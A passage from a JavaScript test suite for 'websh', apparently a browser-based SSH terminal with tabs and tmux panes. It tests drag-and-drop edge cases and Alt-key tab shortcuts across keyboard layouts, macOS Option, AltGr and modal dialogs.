  await until(() => tabId(activeTab(win)) === tabOfPane(a), 500);
  // A pane bar dragged; the pane's shell exits before the drop.
  const m = pointer(win);
  const [x0, y0] = centre(labelEl(b));
  m.down(labelEl(b), x0, y0);
  m.move(labelEl(b), x0 + 20, y0 + 20);
  m.move($(win, 'tabs'), x0 + 40, y0);
  win.closePane(b.id);
  m.up($(win, 'tabs'), x0 + 40, y0);
  await sleep(50);
  ok(tabEls(win).length === 2 && tabRoots(win).length === 2, 'no tab made for a pane that is gone; got ' + tabEls(win).length);
  ok(layoutProblems(win).length === 0, 'layout sound: ' + JSON.stringify(layoutProblems(win)));
  // A tab dragged over a pane; that tab is closed before the drop.
  const tC = tabOfPane(c);
  let zone = null;
  dragTabOnto(win, tabById(win, tC), a, 'right', {beforeUp: () => { zone = zoneOf(a); win.closeTab(tC); }});
  await sleep(50);
  ok(zone === 'right', 'the zone was shown; got ' + JSON.stringify(zone));
  ok(tabEls(win).length === 1 && shape(win, tabOfPane(a)) === 'a.host', 'nothing merged from a closed tab; got ' + JSON.stringify(shapesNow(win)));
  ok(anyZone(win) === 0 && !win.document.querySelector('.dragging'), 'no zone or drag state left');
  ok(layoutProblems(win).length === 0, 'layout sound: ' + JSON.stringify(layoutProblems(win)));
  cleanup(env);
});

test('move (break): a tab drag over a pane, the window loses focus, comes back without the button', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S3); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !needMove(win) || !b) { cleanup(env); return; }
  clickTab(win, tabElOfPane(win, a));
  await until(() => tabId(activeTab(win)) === tabOfPane(a), 500);
  const before = JSON.stringify(shapesNow(win));
  const m = dragTabOnto(win, tabElOfPane(win, b), a, 'left', {noUp: true});
  ok(zoneOf(a) === 'left', 'zone shown while dragging');
  win.dispatchEvent(new win.Event('blur'));
  await sleep(20);
  const zoneAfterBlur = zoneOf(a);
  m.moveNoButton(a.el, 100, 100);
  ok(anyZone(win) === 0, 'once the pointer is back without the button, no zone is left (after the blur alone: ' + JSON.stringify(zoneAfterBlur) + ')');
  m.up(a.el, 100, 100);
  ok(JSON.stringify(shapesNow(win)) === before, 'nothing merged; got ' + JSON.stringify(shapesNow(win)));
  ok(tabId(activeTab(win)) === tabOfPane(a), 'A still in front');
  // A click on a tab right after still switches tabs (no stale click blocker).
  await sleep(450);
  clickTab(win, tabElOfPane(win, b));
  await until(() => tabId(activeTab(win)) === tabOfPane(b), 500);
  ok(tabId(activeTab(win)) === tabOfPane(b), 'a later click on B shows B');
  cleanup(env);
});

// =====================================================================
// Tabs (step 4) - keyboard.
//
// Alt+1..Alt+8 go to tab N (nothing if there is no tab N), Alt+9 to the
// last tab, Alt+T is "+", Alt+W closes the active tab (same confirm rule
// as the tab's x), Alt+Shift+[ / Alt+Shift+] previous / next tab with
// wrap. Matched by e.code, so a Cyrillic layout (e.key 'е' for KeyT) and
// macOS Option (e.key '¡' for Digit1) work. The combos are websh's: they
// are consumed (preventDefault) and never reach the shell; every other
// Alt combo (readline's Alt+B/F/D/., Alt+Backspace, Option+arrows) does.
// Ctrl+Alt (AltGr on Windows layouts) never switches tabs. Under a modal
// (login form, options, the terminate confirm) nothing happens.
//
// The real path is xterm's: keys are typed into xterm's hidden textarea
// inside the pane, and xterm's keydown listener on that textarea first
// asks the handler from attachCustomKeyEventHandler, and - unless it
// returns false - turns the key into data (Alt+x -> ESC x), emits it on
// onData, and CANCELS the event (preventDefault + stopPropagation), so a
// plain bubbling listener on document never sees it. xtermKeys() below
// installs exactly that model on a pane; on "mac" it models Option
// without macOptionIsMeta: xterm leaves the key alone in keydown and the
// composed character ('¡', '∫', ...) arrives afterwards (keypress/input)
// unless the keydown was default-prevented.
// =====================================================================
const US_PUNCT = {BracketLeft: ['[', '{'], BracketRight: [']', '}'], Period: ['.', '>'],
                  Comma: [',', '<'], Minus: ['-', '_'], Slash: ['/', '?']};
function xtermData(e) {
  if (e.ctrlKey && e.altKey) return null;          // AltGr / Ctrl+Alt: not modelled, sends nothing
  if (e.metaKey) return null;
  if (e.altKey) {
    if (e.code === 'Backspace') return '\x1b\x7f';
    if (e.code === 'ArrowLeft') return '\x1b[1;3D';
    if (e.code === 'ArrowRight') return '\x1b[1;3C';
    let m = /^Key([A-Z])$/.exec(e.code);
    if (m) return '\x1b' + (e.shiftKey ? m[1] : m[1].toLowerCase());
    m = /^Digit(\d)$/.exec(e.code);
    if (m) return '\x1b' + m[1];
    if (US_PUNCT[e.code]) return '\x1b' + US_PUNCT[e.code][e.shiftKey ? 1 : 0];
    return null;
  }
  if (!e.ctrlKey && e.key && e.key.length === 1) return e.key;
  if (e.code === 'Enter') return '\r';
  return null;
}
function xtermKeys(win, p, mac) {
  const host = p.el.querySelector('.pane-term') || p.el;
  let ta = host.querySelector('textarea.xterm-helper-textarea');
  if (!ta) {
    ta = win.document.createElement('textarea');
    ta.className = 'xterm-helper-textarea';
    host.appendChild(ta);
    ta.addEventListener('keydown', e => {
      const term = p.term;
      if (term._customKey && term._customKey(e) === false) return;
      if (mac && e.altKey && !e.ctrlKey && !e.metaKey) return;   // composed char comes later
      const d = xtermData(e);
      if (d == null) return;
      if (term._onDataCb) term._onDataCb(d);
      e.preventDefault(); e.stopPropagation();
    });
  }
  return ta;
}
const KEYCODES = {BracketLeft: 219, BracketRight: 221, Period: 190, Backspace: 8, ArrowLeft: 37, ArrowRight: 39, Enter: 13};
// Dispatch one keydown like a browser would; returns the event.
function keyOn(win, target, code, key, mods, mac) {
  mods = mods || {};
  const ev = new win.KeyboardEvent('keydown', {key, code, bubbles: true, cancelable: true,
    altKey: !!mods.alt, shiftKey: !!mods.shift, ctrlKey: !!mods.ctrl, metaKey: !!mods.meta, repeat: false});
  let kc = KEYCODES[code];
  if (kc == null) { const m = /^(?:Key|Digit)(.)$/.exec(code); kc = m ? m[1].toUpperCase().charCodeAt(0) : 0; }
  try { Object.defineProperty(ev, 'keyCode', {value: kc}); Object.defineProperty(ev, 'which', {value: kc}); } catch (e) {}
  target.dispatchEvent(ev);
  // macOS Option without macOptionIsMeta: the composed character is
  // typed unless the keydown was cancelled.
  if (mac && ev.altKey && !ev.ctrlKey && !ev.metaKey && !ev.defaultPrevented && key.length === 1) {
    const p = target.__pane;
    if (p && p.term._onDataCb) p.term._onDataCb(key);
  }
  return ev;
}
// Keys go into the active pane's xterm textarea.
function typeIn(win, p, code, key, mods, mac) {
  const ta = xtermKeys(win, p, mac);
  ta.__pane = p;
  try { ta.focus(); } catch (e) {}
  return keyOn(win, ta, code, key, mods, mac);
}
const activePane = win => win.panes[win.activeId];
// Everything /api/input carried, per session.
function inputRecorder() {
  const got = [];
  const entry = {action: 'input', match: bd => bd && typeof bd.data === 'string',
                 response: bd => { got.push({sid: bd.session_id, data: bd.data}); return {ok: true}; }};
  return {got, entry, all: () => got.map(g => g.data).join(''),
          of: sid => got.filter(g => g.sid === sid).map(g => g.data).join('')};
}
// Wait until everything typed so far has been flushed: type a sentinel
// (plain key) into pane p, wait for it on the wire. Input is ordered.
let _sentinelN = 0;
async function flushedThrough(win, rec, p) {
  const s = String.fromCharCode(0x71 + (_sentinelN++ % 8));   // q..x, one key
  const mark = '@' + s;
  const ta = xtermKeys(win, p);
  ta.__pane = p;
  keyOn(win, ta, 'Digit2', '@', {shift: true});
  keyOn(win, ta, 'Key' + s.toUpperCase(), s);
  const okk = await until(() => rec.of(p.sid).indexOf(mark) >= 0, 1500);
  ok(okk, 'sentinel ' + JSON.stringify(mark) + ' reached the shell of ' + p.host + ' (input path alive)');
  return okk;
}
const show = s => JSON.stringify(s);
async function threeTabs(win, opts) {
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host', opts && opts.b);
  const c = b && await tNewTab(win, 'c.host');
  return [a, b, c];
}
const tabIdx = win => tabEls(win).indexOf(activeTab(win));
const titleOf = t => {
  if (!t) return '';
  const own = t.getAttribute('title') || '';
  const kids = Array.from(t.querySelectorAll('[title]')).map(x => x.getAttribute('title')).join(' | ');
  return own + (kids ? ' | ' + kids : '');
};

test('tabs keys: Alt+1..Alt+8 go to tab N from inside the terminal; Alt+9 to the last; a missing N does nothing', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry])); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup: three tabs'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b), tC = tabOfPane(c);
  ok(tabId(activeTab(win)) === tC, 'setup: C in front');
  let ev = typeIn(win, c, 'Digit1', '1', {alt: true});
  await until(() => tabId(activeTab(win)) === tA, 500);
  ok(tabId(activeTab(win)) === tA, 'Alt+1 typed in C\'s terminal shows tab 1 (A); active tab is now #' + tabIdx(win));
  ok(win.activeId === a.id, 'and A\'s pane is the active pane');
  ok(ev.defaultPrevented, 'Alt+1 is consumed (preventDefault)');
  ev = typeIn(win, a, 'Digit2', '2', {alt: true});
  await until(() => tabId(activeTab(win)) === tB, 500);
  ok(tabId(activeTab(win)) === tB && win.activeId === b.id, 'Alt+2 shows tab 2 (B)');
  ok(b.term._focusCalls > 0, 'keyboard focus goes into B\'s pane');
  ok(ev.defaultPrevented, 'Alt+2 consumed');
  ev = typeIn(win, b, 'Digit9', '9', {alt: true});
  await until(() => tabId(activeTab(win)) === tC, 500);
  ok(tabId(activeTab(win)) === tC, 'Alt+9 shows the last tab (C)');
  ok(ev.defaultPrevented, 'Alt+9 consumed');
  // Missing tab: nothing changes, but the key is still not the shell's.
  const before = tabId(activeTab(win)), beforePane = win.activeId;
  const ev5 = typeIn(win, c, 'Digit5', '5', {alt: true});
  const ev8 = typeIn(win, c, 'Digit8', '8', {alt: true});
  await sleep(30);
  ok(tabId(activeTab(win)) === before && win.activeId === beforePane, 'Alt+5 / Alt+8 with 3 tabs change nothing');
  ok(ev5.defaultPrevented && ev8.defaultPrevented, 'Alt+5 / Alt+8 with no such tab are still consumed');
  // Alt+3 when on tab 3 already: stays.
  typeIn(win, c, 'Digit3', '3', {alt: true});
  ok(tabId(activeTab(win)) === tC, 'Alt+3 on tab 3 stays on tab 3');
  await flushedThrough(win, rec, c);
  await flushedThrough(win, rec, c);
  const all = rec.all();
  ok(!/\x1b[0-9]/.test(all), 'no ESC+digit reached any shell; /api/input carried ' + show(all));
  cleanup(env);
});

test('tabs keys: Alt+N also works when the focus is not in a terminal (after clicking the tab strip)', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const ev = keyOn(win, $(win, 'tabs'), 'Digit1', '1', {alt: true});
  await until(() => tabId(activeTab(win)) === tabOfPane(a), 500);
  ok(tabId(activeTab(win)) === tabOfPane(a), 'Alt+1 dispatched on the tab strip shows tab 1');
  ok(ev.defaultPrevented, 'consumed');
  const ev2 = keyOn(win, win.document.body, 'BracketRight', '}', {alt: true, shift: true});
  await until(() => tabId(activeTab(win)) === tabOfPane(b), 500);
  ok(tabId(activeTab(win)) === tabOfPane(b), 'Alt+Shift+] on body shows the next tab');
  ok(ev2.defaultPrevented, 'consumed');
  cleanup(env);
});

test('tabs keys: Alt+Shift+[ / Alt+Shift+] go to the previous / next tab and wrap, one step per press', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry])); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const ids = [a, b, c].map(tabOfPane);
  const seen = [];
  for (let i = 0; i < 4; i++) {
    const ev = typeIn(win, activePane(win), 'BracketRight', '}', {alt: true, shift: true});
    await sleep(5);
    seen.push(ids.indexOf(tabId(activeTab(win))) + (ev.defaultPrevented ? '' : '!'));
  }
  ok(show(seen) === show(['0', '1', '2', '0']),
     'from C, Alt+Shift+] x4 goes A,B,C,A (wraps, one step each, consumed); got ' + show(seen) + ' (! = not consumed)');
  const back = [];
  for (let i = 0; i < 4; i++) {
    const ev = typeIn(win, activePane(win), 'BracketLeft', '{', {alt: true, shift: true});
    await sleep(5);
    back.push(ids.indexOf(tabId(activeTab(win))) + (ev.defaultPrevented ? '' : '!'));
  }
  ok(show(back) === show(['2', '1', '0', '2']),
     'from A, Alt+Shift+[ x4 goes C,B,A,C (wraps); got ' + show(back));
  ok(win.activeId === c.id, 'the active pane follows the tab');
  await flushedThrough(win, rec, c);
  const all = rec.all();
  ok(!/\x1b[{}\[\]]/.test(all), 'no ESC+{ / ESC+} reached a shell; /api/input carried ' + show(all));
  cleanup(env);
});

test('tabs keys: with one tab, next/previous and Alt+1/Alt+9 stay put and still do not reach the shell', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry])); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const evs = [typeIn(win, a, 'BracketRight', '}', {alt: true, shift: true}),
               typeIn(win, a, 'BracketLeft', '{', {alt: true, shift: true}),
               typeIn(win, a, 'Digit1', '1', {alt: true}), typeIn(win, a, 'Digit9', '9', {alt: true})];
  ok(tabEls(win).length === 1 && win.activeId === a.id, 'still one tab, same pane');
  ok(evs.every(e => e.defaultPrevented), 'all four consumed; got ' + show(evs.map(e => e.defaultPrevented)));
  await flushedThrough(win, rec, a);
  ok(!/\x1b[19{}]/.test(rec.all()), 'nothing of them on the wire; got ' + show(rec.all()));
  cleanup(env);
});

test('tabs keys: a Cyrillic layout (e.key "е"/"ц"/"х"/"ъ") and macOS Option ("¡","™","†","∑","”","’") work by e.code', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry])); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b), tC = tabOfPane(c);
  // Cyrillic (ЙЦУКЕН): Digit keys give digits, KeyT -> 'е', KeyW -> 'ц', [ -> 'х', ] -> 'ъ'.
  typeIn(win, c, 'Digit1', '1', {alt: true});
  ok(tabId(activeTab(win)) === tA, 'cyrillic Alt+1 -> tab 1');
  typeIn(win, a, 'BracketRight', 'Ъ', {alt: true, shift: true});
  ok(tabId(activeTab(win)) === tB, 'cyrillic Alt+Shift+] (e.key "Ъ") -> next tab');
  typeIn(win, b, 'BracketLeft', 'Х', {alt: true, shift: true});
  ok(tabId(activeTab(win)) === tA, 'cyrillic Alt+Shift+[ (e.key "Х") -> previous tab');
  const evT = typeIn(win, a, 'KeyT', 'е', {alt: true});
  await until(() => !hidden($(win, 'ov')), 500);
  ok(!hidden($(win, 'ov')), 'cyrillic Alt+T (e.key "е") opens the + form');
  ok(evT.defaultPrevented, 'and is consumed');
  win.cancelConnect();
  await until(() => hidden($(win, 'ov')), 500);
  ok(tabEls(win).length === 3, 'dismissing it made no tab');
  const evW = typeIn(win, a, 'KeyW', 'ц', {alt: true});
  await until(() => !tabById(win, tA), 500);
  ok(!tabById(win, tA) && !win.panes[a.id], 'cyrillic Alt+W (e.key "ц") closes the active tab (A)');
  ok(evW.defaultPrevented, 'and is consumed');
  await flushedThrough(win, rec, activePane(win));
  ok(!/\x1b[1te{}\[\]]|[еёцхъЪХ]/i.test(rec.all()), 'nothing of the cyrillic combos on the wire; got ' + show(rec.all()));
  cleanup(env);
});

test('tabs keys: macOS Option+digit / Option+T / Option+W / Option+Shift+[ ] act and the symbols never reach the shell', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry])); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b), tC = tabOfPane(c);
  const M = true;
  typeIn(win, c, 'Digit1', '¡', {alt: true}, M);
  ok(tabId(activeTab(win)) === tA, 'Option+1 (e.key "¡") -> tab 1');
  typeIn(win, a, 'Digit2', '™', {alt: true}, M);
  ok(tabId(activeTab(win)) === tB, 'Option+2 (e.key "™") -> tab 2');
  typeIn(win, b, 'Digit9', 'ª', {alt: true}, M);
  ok(tabId(activeTab(win)) === tC, 'Option+9 (e.key "ª") -> last tab');
  typeIn(win, c, 'BracketRight', '’', {alt: true, shift: true}, M);
  ok(tabId(activeTab(win)) === tA, 'Option+Shift+] (e.key "’") -> next tab, wrapping C -> A');
  typeIn(win, a, 'BracketLeft', '”', {alt: true, shift: true}, M);
  ok(tabId(activeTab(win)) === tC, 'Option+Shift+[ (e.key "”") -> previous tab, wrapping A -> C');
  typeIn(win, c, 'KeyT', '†', {alt: true}, M);
  await until(() => !hidden($(win, 'ov')), 500);
  ok(!hidden($(win, 'ov')), 'Option+T (e.key "†") opens the + form');
  win.cancelConnect();
  await until(() => hidden($(win, 'ov')), 500);
  typeIn(win, c, 'KeyW', '∑', {alt: true}, M);
  await until(() => !tabById(win, tC), 500);
  ok(!tabById(win, tC), 'Option+W (e.key "∑") closes the active tab');
  await flushedThrough(win, rec, activePane(win));
  ok(!/[¡™ª’”†∑]/.test(rec.all()), 'none of the Option symbols reached a shell; got ' + show(rec.all()));
  cleanup(env);
});

test('tabs keys: Alt+T is "+": opens the form, connecting makes a new active tab; dismissing makes none', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry]), {local: {websh_connections: JSON.stringify([
    {name: 'saved one', host: 's.host', user: 'u', port: 22}])}});
  const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const ev = typeIn(win, a, 'KeyT', 't', {alt: true});
  await until(() => !hidden($(win, 'ov')), 500);
  ok(!hidden($(win, 'ov')), 'Alt+T opens the login form');
  ok(ev.defaultPrevented, 'Alt+T is consumed');
  ok(!hidden($(win, 'btnCancel')), 'as for "+": the form can be dismissed');
  ok(/saved one/.test($(win, 'savedList').textContent), 'as for "+": saved connections are listed');
  ok(tabEls(win).length === 1, 'opening the form alone creates no tab');
  // Alt+T again while the form is open: nothing new.
  keyOn(win, $(win, 'iH'), 'KeyT', 't', {alt: true});
  ok(!hidden($(win, 'ov')) && tabEls(win).length === 1, 'Alt+T inside the open form changes nothing');
  win.cancelConnect();
  await until(() => hidden($(win, 'ov')), 500);
  ok(tabEls(win).length === 1 && win.activeId === a.id, 'dismissed: no tab made, A still in front');
  typeIn(win, a, 'KeyT', 't', {alt: true});
  await until(() => !hidden($(win, 'ov')), 500);
  const b = await tConnect(win, 'b.host');
  await until(() => tabEls(win).length === 2, 500);
  ok(!!b && tabEls(win).length === 2 && tabOfPane(b) !== tabOfPane(a), 'connecting from it makes a new tab');
  ok(b && tabId(activeTab(win)) === tabOfPane(b) && win.activeId === b.id, 'and the new tab is active');
  await flushedThrough(win, rec, a.sid ? a : b);
  ok(!/\x1bt/i.test(rec.all()), 'no ESC+t reached a shell; got ' + show(rec.all()));
  cleanup(env);
});

test('tabs keys: Alt+W closes the active tab, asks once for a tmux tab, honours "don\'t ask again"', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry])); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b1 = await tNewTab(win, 'b1.host', {persistent: true});
  const b2 = b1 && await tSplit(win, b1, 'h', 'b2.host', {persistent: true});
  const c = b2 && await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup: A, B (two tmux panes), C'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b1), tC = tabOfPane(c);
  const modal = confirmCounter(win);
  // A short-lived tab: closes without a question; the right neighbour, else left, takes over.
  let ev = typeIn(win, c, 'KeyW', 'w', {alt: true});
  await until(() => !tabById(win, tC), 500);
  ok(!tabById(win, tC) && !win.panes[c.id], 'Alt+W in C closes C');
  ok(ev.defaultPrevented, 'Alt+W consumed');
  ok(modal.opened === 0, 'no confirm for a short-lived tab');
  ok(disconnectsFor(env, 'sid-c.host').length === 1, 'C disconnected once');
  ok(tabId(activeTab(win)) === tB, 'the left neighbour (B) is in front');
  // tmux tab: one confirm for both panes; Cancel keeps everything.
  typeIn(win, activePane(win), 'KeyW', 'w', {alt: true});
  await until(() => modal.opened > 0, 500);
  ok(modal.opened === 1, 'Alt+W on a tab with two tmux panes asks once; got ' + modal.opened);
  win.confirmCancel();
  await sleep(30);
  ok(!!tabById(win, tB) && !!b1.sid && !!b2.sid, 'Cancel keeps B and both sessions');
  typeIn(win, activePane(win), 'KeyW', 'w', {alt: true});
  await until(() => modal.opened > 1, 500);
  ok(modal.opened === 2, 'asked again (once) on the second Alt+W');
  win.confirmTerminate(false);
  await until(() => !tabById(win, tB), 500);
  await sleep(30);
  ok(modal.opened === 2, 'still one question per Alt+W');
  ok(disconnectsFor(env, 'sid-b1.host').filter(e => e.body.terminate).length === 1 &&
     disconnectsFor(env, 'sid-b2.host').filter(e => e.body.terminate).length === 1, 'both tmux sessions terminated once');
  ok(tabEls(win).length === 1 && tabId(activeTab(win)) === tA, 'A remains, in front');
  await flushedThrough(win, rec, a);
  ok(!/\x1bw/i.test(rec.all()), 'no ESC+w reached a shell; got ' + show(rec.all()));
  cleanup(env);
});

test('tabs keys: Alt+W with "don\'t ask again" asks nothing; Alt+W on the last tab returns to the login form', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host', {persistent: true});
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  win.localStorage.setItem('websh_terminate_no_ask', '1');
  const modal = confirmCounter(win);
  typeIn(win, b, 'KeyW', 'w', {alt: true});
  await until(() => tabEls(win).length === 1, 500);
  ok(modal.opened === 0 && tabEls(win).length === 1, 'tmux tab closed by Alt+W without a question');
  ok(disconnectsFor(env, 'sid-b.host').some(e => e.body.terminate), 'and its session terminated');
  typeIn(win, a, 'KeyW', 'w', {alt: true});
  await until(() => !hidden($(win, 'ov')), 500);
  ok(Object.keys(win.panes).length === 0 && !hidden($(win, 'ov')), 'Alt+W on the last tab: no panes, the initial login form');
  ok(win.overlayMode === 'initial', 'the form is the initial one; got ' + win.overlayMode);
  cleanup(env);
});

test('tabs keys: other Alt combos reach the shell unchanged and switch nothing', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry])); const win = env.win;
  const [a, b] = await (async () => { const x = await tConnect(win, 'a.host'); return [x, x && await tNewTab(win, 'b.host')]; })();
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tB = tabOfPane(b);
  const combos = [['KeyB', 'b', {alt: true}, '\x1bb'], ['KeyF', 'f', {alt: true}, '\x1bf'],
                  ['Period', '.', {alt: true}, '\x1b.'], ['KeyD', 'd', {alt: true}, '\x1bd'],
                  ['Backspace', 'Backspace', {alt: true}, '\x1b\x7f'],
                  ['ArrowLeft', 'ArrowLeft', {alt: true}, '\x1b[1;3D'], ['ArrowRight', 'ArrowRight', {alt: true}, '\x1b[1;3C'],
                  ['BracketLeft', '[', {alt: true}, '\x1b['], ['BracketRight', ']', {alt: true}, '\x1b]']];
  combos.forEach(k => typeIn(win, b, k[0], k[1], k[2]));
  ok(tabId(activeTab(win)) === tB && win.activeId === b.id, 'none of them switched tabs (Alt+Left/Right included)');
  await flushedThrough(win, rec, b);
  const want = combos.map(k => k[3]).join('');
  const got = rec.of(b.sid);
  ok(got.indexOf(want) === 0, 'B\'s shell got exactly ' + show(want) + ' (Alt+B,F,.,D,Backspace,Left,Right,[,] in order); got ' + show(got));
  cleanup(env);
});

test('tabs keys: Ctrl+Alt+digit / Ctrl+Alt+Shift+] (AltGr) never switch tabs', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const tC = tabOfPane(c);
  const evs = [];
  for (const d of ['1', '2', '9']) evs.push(typeIn(win, c, 'Digit' + d, d === '2' ? '@' : d, {alt: true, ctrl: true}));
  evs.push(typeIn(win, c, 'BracketRight', '}', {alt: true, ctrl: true, shift: true}));
  evs.push(typeIn(win, c, 'KeyW', 'w', {alt: true, ctrl: true}));
  evs.push(typeIn(win, c, 'KeyT', 't', {alt: true, ctrl: true}));
  await sleep(30);
  ok(tabId(activeTab(win)) === tC && tabEls(win).length === 3 && hidden($(win, 'ov')),
     'Ctrl+Alt+1/2/9, Ctrl+Alt+Shift+], Ctrl+Alt+W, Ctrl+Alt+T: still on C, 3 tabs, no form');
  ok(evs.every(e => !e.defaultPrevented), 'websh did not cancel them (AltGr characters must still type); got ' +
     show(evs.map(e => e.defaultPrevented)));
  // And an AltGr event as Chrome on Windows really sends it: ctrlKey+altKey+AltGraph.
  const ev = new win.KeyboardEvent('keydown', {key: '@', code: 'Digit2', ctrlKey: true, altKey: true, bubbles: true, cancelable: true});
  ev.getModifierState = m => m === 'AltGraph';
  xtermKeys(win, c).dispatchEvent(ev);
  ok(tabId(activeTab(win)) === tC, 'AltGr+2 does not switch tabs');
  cleanup(env);
});

test('tabs keys: under the login form, the options and the terminate confirm the shortcuts do nothing', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host', {persistent: true});
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  // Each key alone, checked right after it: a sequence could undo
  // itself (Alt+1 then Alt+9 lands where it started).
  const moved = [];
  const allKeys = (target, where) => {
    const confirmWas = !hidden($(win, 'confirmOv'));
    [['Digit1', '1', {alt: true}], ['Digit9', '9', {alt: true}], ['BracketLeft', '{', {alt: true, shift: true}],
     ['BracketRight', '}', {alt: true, shift: true}], ['KeyW', 'w', {alt: true}]].forEach(k => {
      keyOn(win, target, k[0], k[1], k[2]);
      if (tabId(activeTab(win)) !== tB || tabEls(win).length !== 2 || win.activeId !== b.id ||
          (!confirmWas && !hidden($(win, 'confirmOv')))) {
        moved.push(where + ': ' + k[0] + (k[2].shift ? '+shift' : ''));
        if (!confirmWas && !hidden($(win, 'confirmOv'))) win.confirmCancel();
        if (tabById(win, tB)) clickTab(win, tabById(win, tB));
      }
    });
  };
  // 1. The + form, keys typed in its host field and on the body.
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 500);
  allKeys($(win, 'iH'), 'form/host field'); allKeys(win.document.body, 'form/body');
  await sleep(30);
  ok(moved.length === 0 && tabId(activeTab(win)) === tB && tabEls(win).length === 2 && win.activeId === b.id,
     'login form open: Alt+1/9/Shift+[/Shift+]/W switched, closed or asked nothing; did: ' + show(moved));
  ok(!hidden($(win, 'ov')), 'the form is still open');
  win.cancelConnect();
  await until(() => hidden($(win, 'ov')), 500);
  // 2. Options.
  win.openOptions();
  ok(!hidden($(win, 'ovOpt')), 'setup: options open');
  moved.length = 0;
  allKeys(win.document.body, 'options');
  keyOn(win, win.document.body, 'KeyT', 't', {alt: true});
  await sleep(30);
  ok(moved.length === 0 && tabId(activeTab(win)) === tB && tabEls(win).length === 2,
     'options open: nothing switched, closed or asked; did: ' + show(moved));
  ok(hidden($(win, 'ov')), 'options open: Alt+T did not open the login form over it');
  win.closeOptions();
  // 3. The terminate confirm (Alt+W on the tmux tab), then more keys under it.
  const modal = confirmCounter(win);
  typeIn(win, b, 'KeyW', 'w', {alt: true});
  await until(() => modal.opened === 1, 500);
  ok(modal.opened === 1, 'setup: Alt+W asks to terminate');
  moved.length = 0;
  allKeys(win.document.body, 'confirm');
  keyOn(win, win.document.body, 'KeyT', 't', {alt: true});
  await sleep(30);
  ok(moved.length === 0 && tabId(activeTab(win)) === tB && tabEls(win).length === 2,
     'confirm open: no switch, nothing closed; did: ' + show(moved));
  ok(modal.opened === 1 && !hidden($(win, 'confirmOv')), 'confirm still the one question');
  ok(hidden($(win, 'ov')), 'confirm open: Alt+T did not open the login form');
  win.confirmCancel();
  await sleep(30);
  ok(!!tabById(win, tA) && !!tabById(win, tB), 'Cancel keeps both tabs');
  cleanup(env);
});

test('tabs keys: tooltips name the shortcut - tab N says Alt+N (N<=8), + says Alt+T, and they follow the order', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const ts = tabEls(win);
  ts.forEach((t, i) => ok(titleOf(t).indexOf('Alt+' + (i + 1)) >= 0,
    'tab ' + (i + 1) + ' tooltip mentions Alt+' + (i + 1) + '; got ' + show(titleOf(t))));
  ok(titleOf($(win, 'tabNew')).indexOf('Alt+T') >= 0, '"+" tooltip mentions Alt+T; got ' + show(titleOf($(win, 'tabNew'))));
  // Close tab 1: the former tab 2 is now tab 1, and says so.
  closeTabX(win, tabElOfPane(win, a));
  await until(() => tabEls(win).length === 2, 500);
  const t2 = tabEls(win);
  ok(t2.length === 2 && titleOf(t2[0]).indexOf('Alt+1') >= 0 && titleOf(t2[0]).indexOf('Alt+2') < 0,
     'after closing tab 1, B (now first) says Alt+1, not Alt+2; got ' + show(titleOf(t2[0])));
  ok(titleOf(t2[1]).indexOf('Alt+2') >= 0 && titleOf(t2[1]).indexOf('Alt+3') < 0,
     'C (now second) says Alt+2; got ' + show(titleOf(t2[1])));
  cleanup(env);
});

test('tabs keys: the tooltip of tab 9 and later does not promise Alt+9..', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
